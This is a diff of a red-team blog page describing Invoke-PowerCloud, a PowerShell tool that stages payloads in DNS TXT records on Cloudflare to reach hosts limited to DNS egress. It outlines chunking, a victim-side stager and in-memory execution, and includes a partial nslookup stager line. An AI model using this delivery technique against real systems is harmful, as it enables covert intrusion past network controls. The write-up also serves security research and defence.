@@ -10,13 +10,13 @@ description: >-
 
 Rushing to say that the tool [**Invoke-PowerCloud**](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) was heavily inspired by and based on the awesome work that Dominic Chell \([@domchell](https://twitter.com/domchell)\) from [MDSec](https://twitter.com/MDSecLabs) had done with [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) - go follow them and try out the [tool](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) if you are not doing so yet!
 
-Not only that, I want to thank Dominic for taking time to answer some of my questions I had regarding the PowerDNS, the setup and helping me troubleshoot it as I was having "some" issues getting the payload delivered to the client.
+Not only that, I want to thank Dominic for taking his time to answer some of my questions regarding the PowerDNS, the setup and helping me troubleshoot it as I was having "some" issues getting the payload delivered to the target from the PowerDNS server.
 
 ...which eventually led me to Invoke-PowerCloud, so read on.
 
 ## What is Invoke-PowerCloud?
 
-[Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) is a script that allows you to deliver a payload using DNS TXT records to an environment that is egress limited to DNS only.
+[Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) is a script that allows you to deliver a powershell payload using DNS TXT records to a target in an environment that is egress limited to DNS only.
 
 ## How is Invoke-PowerCloud different from PowerDNS?
 
@@ -26,7 +26,7 @@ Invoke-PowerCloud works in a similar fashion, except for a couple of key differe
   
 **With PowerDNS you need:**
 
-* a dedicated linux box with a public IP where you can run PowerDNS so it can act as a DNS NameServer
+* a dedicated linux box with a public IP where you can run PowerDNS, so it can act as a DNS server
 * you also need multiple domain names to get the nameservers configured properly
 
 **With Invoke-PowerCloud you need:**
@@ -41,10 +41,10 @@ The way the tools works is by performing the following high level steps:
 * Take the powershell payload file
 * Divide the payload file into chunks of 255 bytes
 * Create a DNS zone file with DNS TXT records representing each chunk of the payload data retrieved from the previous step in base64 format
-* Send the DNS zone file to cloudlfare
-* Generate two stagers for use with autoritative NS/non-authoritative NS, that can be then executed on the target system
+* Send the generated DNS zone file to cloudlfare using their APIs
+* Generate two stagers for use with autoritative NS/non-authoritative NS
 * Stager can then be executed on the victim system. The stager will recover the base64 chunks from the DNS TXT records and rebuild the original payload
-* Payload gets executed in memory
+* Payload gets executed in memory - boom!
 * If you run the tool again to deliver another payload, the previous DNS TXT records will be deleted
 
 ## Demo / Execution
@@ -106,13 +106,17 @@ $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }
 
 ![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)
 
-The stager then can be executed on the victim system to get the payload delivered:
+Let's execite the stager on the victim system to get the payload delivered via DNS:
 
 ![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-12.png)
 
 Everything in action can be seen in the below gif:
 
 ![](../.gitbook/assets/invoke-powercloud-demo.gif)
+
+## Is Invoke-PowerCloud better than PowerDNS?
+
+No. It just works slightly differently, but achieves the same end goal.
 
 ## Download
 
